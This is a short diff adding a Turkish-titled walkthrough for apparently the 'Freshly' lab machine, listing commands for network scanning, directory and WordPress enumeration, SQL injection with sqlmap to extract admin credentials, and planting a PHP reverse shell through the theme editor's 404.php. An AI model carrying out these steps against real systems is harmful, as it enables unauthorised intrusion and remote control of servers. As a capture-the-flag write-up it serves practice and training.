@@ -1,0 +1,12 @@
+FRESHLY MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.102 bulundu.
+2 - nmap -sT -A 192.168.2.102
+3 - gobuster dir -u http://192.168.2.102:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+4 - wpscan --url http://192.168.2.102:8080/wordpress/ -e u
+5 - nikto -h 192.168.2.102
+6 - sqlmap -u http://192.168.2.102/login.php --forms --dbs
+7 - sqlmap -u http://192.168.2.102/login.php --forms -D wordpress8080, admin:SuperSecretPassword
+8 - http://192.168.2.102:8080/wordpress/wp-admin/
+9 - Appearance -> Editor -> 404.php
+10 - cp /usr/share/webshells/php/php-reverse-shell.php .
+11 - su -
